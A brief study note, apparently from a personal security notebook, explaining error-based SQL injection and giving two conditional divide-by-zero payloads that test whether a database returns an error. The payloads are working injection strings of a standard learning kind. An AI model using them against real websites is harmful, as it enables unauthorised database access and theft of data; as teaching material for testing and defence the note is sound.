---
Title: Error-based SQLi
tags:
  - SQLi
  - ERROR-BASEDSQLi
---
Error based sql is focused on error messages that a website returns, and exploiting that to extract sensitive data from the database.

> [!Example]
> ```sql
> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
> --- in simpler terms: if 1=2, execute 1/0 (1 divided by 0, which returns a database error), else, return 'a'
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

